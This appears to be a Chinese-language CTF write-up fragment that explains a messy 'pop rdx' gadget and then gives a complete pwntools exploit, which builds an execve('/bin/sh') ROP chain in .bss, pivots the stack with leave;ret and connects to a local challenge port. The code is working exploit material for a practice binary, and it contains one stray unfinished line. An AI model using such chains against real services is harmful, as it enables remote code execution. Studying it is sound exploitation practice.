现在还差一个rdx = 0

rdx的链不干净

```bash
0x4684fc : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
```

>- 弹一个值给 `rdx`
>- 把 `eax` 清零
>- 再弹 4 个垃圾值给 `rbx`、`r12`、`r13`、`rbp`

涉及rax相关，所以先考虑把rdx设置好,再把rax设置

那么就是

```python
execve_chain = flat([
```

exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

bss       = 0x4a9a80
leave_ret = 0x401876

pop_rax   = 0x42149b
pop_rdi   = 0x432e48
pop_rsi   = 0x402b86
pop_rdx   = 0x4684fc  
syscall   = 0x401324

rop_part = flat([
    0,
    pop_rdx, 0, 0, 0, 0, 0,
    pop_rax, 59,
    pop_rdi, 0,
    pop_rsi, 0,
    syscall
])
binsh_addr = bss + len(rop_part)
argv_addr = binsh_addr + 8

rop_chain = flat([
    0,
    pop_rdx, 0, 0, 0, 0, 0,
    pop_rax, 59,
    pop_rdi, binsh_addr,
    pop_rsi, argv_addr,
    syscall
]) + b"/bin/sh\x00" + p64(binsh_addr) + p64(0)

p = remote('127.0.0.1', 51356)

p.recvuntil(b"data:")  
p.send(p16(0x400))
p.send(rop_chain.ljust(0x400, b'\x00'))

payload = b'A' * 16 + p64(bss) + p64(leave_ret)
payload = payload.ljust(0x28, b'A')
p.send(payload)

p.interactive()
```
